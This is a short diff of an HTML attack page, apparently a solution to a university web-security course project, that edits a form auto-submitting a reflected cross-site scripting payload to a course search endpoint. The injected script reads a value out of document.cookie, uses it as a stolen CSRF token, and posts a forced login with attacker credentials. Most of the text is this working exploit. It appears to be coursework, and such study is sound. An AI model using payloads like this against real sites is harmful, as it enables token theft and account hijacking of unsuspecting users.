@@ -10,7 +10,7 @@
         ></script>
     </head>
     <body>
-        <iframe id="frame" name="frame" hidden></iframe>
+        <iframe id="frame" name="frame"></iframe>
         <form
             id="myForm"
             action="https://project2.ecen4133.org/search?csrfdefense=1&xssdefense=0"
@@ -25,7 +25,7 @@
                 name="q"
                 value="
                   <script>
-                    $(window).load(function(){
+                    $(window).bind('load', function(){
                       var pwned = document.cookie.split(';')[2].split('=')[1];
                       var url = 'https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0';
                       $.post(url, {username: 'attacker', password: 'l33th4x', csrf_token: pwned});
